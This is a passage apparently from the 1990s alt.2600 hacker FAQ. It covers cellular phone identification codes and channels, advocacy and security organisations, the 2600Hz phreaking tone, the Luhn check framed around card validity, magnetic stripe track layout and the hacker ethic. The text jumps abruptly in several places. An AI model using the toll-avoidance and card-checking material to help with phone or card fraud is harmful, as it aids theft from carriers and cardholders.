expansion to 832 channels occured in 1988.  Bit 2 tells the cellular
system whether your cellular telephone is a mobile unit or a voice
activated cellular telephone.  Bit's 3 and 4 tell the cell tower what
power your cellular telephone should be transmitting on.

Bit 1:    0 == 666 channels
          1 == 832 channels

Bit 2:    0 == Mobile cellular telephone
          1 == Voice activated cellular telephone

Bit 3/4: 00 == 3.0 watts (Mobiles)
         01 == 1.2 watts (Transportables)
         10 == .06 watts (Portables)
         11 == Reserved for future use


06. What is a SIDH?

SIDH stands for System Identification for Home System.  The SIDH in your
cellular telephone tells the cellular system what area your cellular
service originates from.  This is used in roaming (making cellular calls
when in an area not served by your cellular provider).

Every geographical region has two SIDH codes, one for the wireline
carrier and one for the nonwireline carrier.  These are the two
companies that are legally allowed to provide cellular telephone service
in that region. The wireline carrier is usually your local telephone
company, while the nonwireline carrier will be another company.  The
SIDH for the wireline carrier is always an even number, while the SIDH
for the nonwireline carrier is always an odd number.  The wireline
carrier is also known as the Side-B carrier and the non-wireline carrier
is also known as the Side-A carrier.


07. What are the forward/reverse channels?

Forward channels are the frequencies the cell towers use to talk to your
cellular telephone.  Reverse channels are the frequencies your cellular
telephone uses to talk to the cell towers.

The forward channel is usually 45 mhz above the reverse channel.  For
example, if the reverse channel is at 824 mhz, the forward channel would
be at 869 mhz.

  Publisher: IDG Books

        Not a total waste of paper, but definitely not worth the
        $49.95 purchase price.  The book is a rehash of previously
        published information.  The only secret we learn from reading
        the book is that Sylvia Moon is a younger woman madly in love
        with the older David Stang.

Computer Professionals for Social Responsibility (CPSR)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CPSR empowers computer professionals and computer users to advocate for
the responsible use of information technology and empowers all who use
computer technology to participate in the public debate.   As technical
experts, CPSR members provide the public and policy makers with
realistic assessments of the power, promise, and limitations of computer
technology.  As an organization of concerned citizens, CPSR directs
public attention to critical choices concerning the applications of
computing and how those choices affect society.

By matching unimpeachable technical information with policy development
savvy, CPSR uses minimum dollars to have maximum impact and encourages
broad public participation in the shaping of technology policy.

Every project we undertake is based on five principles:

*  We foster and support public discussion of and public responsibility
   for decisions involving the use of computers in systems critical to
   society.

*  We work to dispel popular myths about the infallibility of
   technological systems.

*  We challenge the assumption that technology alone can solve political
   and social problems.

*  We critically examine social and technical issues within the computer
   profession, nationally and internationally.

*  We encourage the use of computer technology to improve the quality of
   life.

Electronic Frontier Foundation (EFF)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The Electronic Frontier Foundation (EFF) is dedicated to the pursuit
of policies and activities that will advance freedom and openness in
computer-based communications. It is a member-supported, nonprofit
group that grew from the conviction that a new public interest
organization was needed in the information age; that this organization
would enhance and protect the democratic potential of new computer
communications technology. From the beginning, the EFF determined to
become an organization that would combine technical, legal, and public
policy expertise, and would apply these skills to the myriad issues
and concerns that arise whenever a new communications medium is born.

Memberships are $20.00 per year for students, $40.00 per year for
regular members, and $100.00 per year for organizations.

Free Software Foundation (FSF) and GNU
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The Free Software Foundation is dedicated to eliminating restrictions
on people's right to use, copy, modify, and redistribute computer
programs. We promote the development and use of free software in all
areas using computers.  Specifically, we are putting together a
complete, integrated software system named "GNU" ("GNU's Not Unix",
pronounced "guh-new") that will be upwardly compatible with Unix.
Most parts of this system are already being used and distributed.

The word "free" in our name refers to freedom, not price.  You may or
may not pay money to get GNU software, but regardless you have two
specific freedoms once you get it: first, the freedom to copy a
program and give it away to your friends and co-workers; and second,
the freedom to change a program as you wish, by having full access to
source code. You can study the source and learn how such programs are
written.  You may then be able to port it, improve it, and share your
changes with others.  If you redistribute GNU software you may charge
a distribution fee or give it away, so long as you include the source
code and the GPL (GNU General Public License).

GNU is to be a complete integrated computational environment:
everything you need to work with a computer, either as a programmer or
as a person in an office or home.  The core is an operating system,
which consists of a central program called a kernel that runs the
other programs on the computer, and a large number of ancillary
programs for handling files, etc.  The Free Software Foundation is
developing an advanced kernel called the Hurd.

A complete system has tools for programmers, such as compilers and
debuggers.  It also has editors, sketchpads, calendars, calculators,
spreadsheets, databases, electronic mail readers, and Internet
navigators.  The FSF already distributes most of the programs used in
an operating system, all the tools regularly used by programmers, and
much more.


The League for Programming Freedom (LPF)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The League for Programming Freedom is an organization of people who
oppose the attempt to monopolize common user interfaces through "look
and feel" copyright lawsuits.  Some of us are programmers, who worry
that such monopolies will obstruct our work.  Some of us are users,
who want new computer systems to be compatible with the interfaces we
know.  Some are founders of hardware or software companies, such as
Richard P. Gabriel. Some of us are professors or researchers,
including John McCarthy, Marvin Minsky, Guy L. Steele, Jr., Robert S.
Boyer and Patrick Winston.

"Look and feel" lawsuits aim to create a new class of government-
enforced monopolies broader in scope than ever before.  Such a system
of user-interface copyright would impose gratuitous incompatibility,
reduce competition, and stifle innovation.

We in the League hope to prevent these problems by preventing
user-interface copyright.  The League is NOT opposed to copyright law
as it was understood until 1986 -- copyright on particular programs.
Our aim is to stop changes in the copyright system which would take
away programmers' traditional freedom to write new programs compatible
with existing programs and practices.

Annual dues for individual members are $42 for employed professionals,
$10.50 for students, and $21 for others.  We appreciate activists, but
members who cannot contribute their time are also welcome.

To contact the League, phone (617) 243-4091, send Internet mail to the

Computer Emergency Response Team (CERT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

CERT is the Computer Emergency Response Team that was formed by the
Defense Advanced Research Projects Agency (DARPA) in November 1988 in
response to the needs exhibited during the Internet worm incident.
The CERT charter is to work with the Internet community to facilitate
its response to computer security events involving Internet hosts, to
take proactive steps to raise the community's awareness of computer
security issues, and to conduct research targeted at improving the
security of existing systems.

CERT products and services include 24-hour technical assistance for
responding to computer security incidents, product vulnerability
assistance, technical documents, and seminars.  In addition, the team
maintains a number of mailing lists (including one for CERT
advisories) and provides an anonymous FTP server:  cert.org
(192.88.209.5), where security-related documents, past CERT
advisories, and tools are archived.

Section E: 2600
~~~~~~~~~~~~~~~

01. What is alt.2600?

Alt.2600 is a Usenet newsgroup for discussion of material relating to
2600 Magazine, the hacker quarterly.   It is NOT for the Atari 2600
game machine.  Len@netsys.com created the group on Emmanuel
Goldstein's recommendation.  Emmanuel is the editor/publisher of 2600
Magazine. Following the barrage of postings about the Atari machine to
alt.2600, an alt.atari.2600 was created to divert all of the atari
traffic from alt.2600.  Atari 2600 people are advised to hie over to
rec.games.video.classic.


02. What does "2600" mean?

	2600Hz was a tone that was used by early phone phreaks (or
phreakers) in the 80's, and some currently.  If the tone was sent down the
line at the proper time, one could get away with all sorts of fun stuff.  

A note from Emmanuel Goldstein:
	
"The Atari 2600 has NOTHING to do with blue boxes or telephones
or the 2600 hertz tone.  The 2600 hertz tone was simply the first
step towards exploring the network.  If you were successful at 
getting a toll call to drop, then billing would stop at that
point but there would be billing for the number already dialed
up until the point of seizure.  800 numbers and long distance
information were both free in the past and records of who called
what were either non-existent or very obscure with regards to
these numbers.  This, naturally, made them more popular than
numbers that showed up on a bill, even if it was only for
a minute.  Today, many 800 numbers go overseas, which provides
a quick and free way into another country's phone system
which may be more open for exploration."


03. Are there on-line versions of 2600 available?

	No.


04. I can't find 2600 at any bookstores.  What can I do?

Subscribe.  Or, let 2600 know via the subscription address that you
think 2600 should be in the bookstore.  Be sure to include the
bookstores name and address.


05. Why does 2600 cost more to subscribe to than to buy at a newsstand?

A note from Emmanuel Goldstein:

  We've been selling 2600 at the same newsstand price ($4) since 1988
  and we hope to keep it at that price for as long as we can get away
  with it. At the same time, $21 is about the right price to cover
  subscriber costs, including postage and record keeping, etc. People
  who subscribe don't have to worry about finding an issue someplace,
  they tend to get issues several weeks before the newsstands get
  them, and they can take out free ads in the 2600 Marketplace.

  This is not uncommon in the publishing industry.  The NY Times, for
  example, costs $156.50 at the newsstands, and $234.75 delivered to your
  door.

02. How do I determine if I have a valid credit card number?

Credit cards use the Luhn Check Digit Algorithm.  The main purpose of
this algorithm is to catch data entry errors, but it does double duty
here as a weak security tool.

For a card with an even number of digits, double every odd numbered
digit and subtract 9 if the product is greater than 9.  Add up all the
even digits as well as the doubled-odd digits, and the result must be
a multiple of 10 or it's not a valid card.  If the card has an odd
number of digits, perform the same addition doubling the even numbered
digits instead.


03. What is the layout of data on magnetic stripe cards?

A standard card may have any of three tracks, or a combination of these
tracks.

Track 1 was the first track standardized.  It was developed by the
International Air Transportation Association (IATA) and is still
reserved for their use.  It is 210bpi with room for 79 characters.  It
includes the primary account number (up to 18 digits) and the name (up
to 26 alphanumeric characters).

Track 2 was developed by the American Bankers Association (ABA) for
on-line financial transactions.  It is 75bpi with room for 40 numeric
characters.  It includes the account number (up to 19 digits).

Track 3 is also used for financial transactions.  The difference is its
read/write ability.  It is 210bpi with room for 107 numeric digits.  It
includes an enciphered PIN, country code, currency units, amount
authorized, subsidiary account information and other restrictions.

For more information, read the ANSI/ISO 7811/1-5 standard.  This
document is available from the American Bankers Association.


04. What are the ethics of hacking?

An excerpt from: Hackers: Heroes of the Computer Revolution
                          by Steven Levy

        Access to computers -- and anything which might teach you
        something about the way the world works -- should be unlimited
        and total. Always yield to the Hands-On imperative.

        All information should be free.

        Mistrust Authority.  Promote Decentralization.

        Hackers should be judged by their hacking, not bogus criteria
        such as degrees, age, race, or position.

        You can create art and beauty on a computer.

        Computers can change your life for the better.
